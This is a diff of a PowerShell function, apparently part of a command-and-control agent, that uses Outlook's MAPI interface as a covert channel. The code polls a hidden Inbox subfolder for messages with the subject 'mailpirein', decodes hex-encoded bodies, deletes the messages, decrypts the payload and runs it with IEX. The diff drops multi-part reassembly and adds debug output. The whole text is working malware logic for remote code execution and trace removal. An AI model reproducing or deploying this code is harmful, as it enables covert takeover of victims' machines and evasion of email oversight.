@@ -130,7 +130,6 @@ function Start-Negotiate {
             $item.Delete()
             $break = $True
             $t = $traw.Split('-')
-
             $bytes = @()
             Foreach ($element in $t) {
               $bytes = $bytes + [byte]([Convert]::toInt16($element,16))
@@ -212,62 +211,29 @@ function Start-Negotiate {
     $break = $False
     $raw = ""
 
-    $inf = 3
-    $parts = @(0)*25
-    $aparts = @(0)*25
-    $totcntr = 0
-    $tot = -1
-    $all = ""
+    write-host "trying next part"
     While ($break -ne $True){
-
       foreach ($item in $mapi.Folders.Item($inf).Folders.Item('Inbox').Folders.Item('tunnelmeszs').Items) {
+        write-host "grr"
         if($item.Subject -eq "mailpirein")
         {
-          $item.HTMLBody | out-null #this seems to force the message to be fully downloaded (not just headers)
-          if($item.Body[$item.Body.Length-1] -ne '-'){ #our message needs to fully load
+
+          #$item.HTMLBody | out-null #this seems to force the message to be fully downloaded (not just headers)
+          if($item.DownloadState -eq 1 -and $item.Body[$item.Body.Length-1] -ne '-'){ #our message needs to fully load
+            $item.Body.length
+            write-host "mooo"
             $traw = $item.Body
             $item.Delete()
-            #$break = $True
+            $break = $True
             $t = $traw.Split('-')
             $bytes = @()
             Foreach ($element in $t) {
               $bytes = $bytes + [byte]([Convert]::toInt16($element,16))
             }
             $raw = $bytes
-          }
-        } elseif ($item.Subject.StartsWith("mailpirein-")){
-          $sub = $item.Subject
-          $item.HTMLBody | out-null #this seems to force the message to be fully downloaded (not just headers)
-          if($item.Body[$item.Body.Length-1] -ne '-'){ #our message needs to fully load
-            $traw = $item.Body
-
-            if ($sub.StartsWith("mailpirein-b")) {
-              $p = 0
-              $tot = $sub.Substring(12)
-            } else {
-              $p = $sub.Substring(11)
-            }
-
-            if ($p -eq "s" -and $totcntr -eq $tot) {
-              $item.Delete()
-              Foreach ($element in $parts) {
-                if ($element -ne 0){
-                    $raw = $raw + $element
-                }
-              }
-              $raw = $raw + "-" + $traw
-              $t = $raw.Split('-')
-              $bytes = @()
-              Foreach ($element in $t) {
-                $bytes = $bytes + [byte]([Convert]::toInt16($element,16))
-              }
-              $praw = $bytes
-              $break = $True
-            } elseif ($p -ne "s") {
-              $parts[$p] = $traw+"-"
-              $totcntr += 1
-              $item.Delete()
-            }
+          } else {
+            $item.MarkForDownload = 1
+            $item.HTMLBody | out-null #this seems to force the message to be fully downloaded (not just headers)
           }
         }
       }
@@ -278,7 +244,7 @@ function Start-Negotiate {
     # $data = $e.GetString($(Decrypt-Bytes -Key $key -In $raw));
     # write-host "data len: $($Data.Length)";
     #IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $praw)) );
-    $pppp =  $e.GetString($(Decrypt-Bytes -Key $key -In $praw))
+    $pppp =  $e.GetString($(Decrypt-Bytes -Key $key -In $raw))
     IEX $($pppp)
 
     #IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $raw)) );
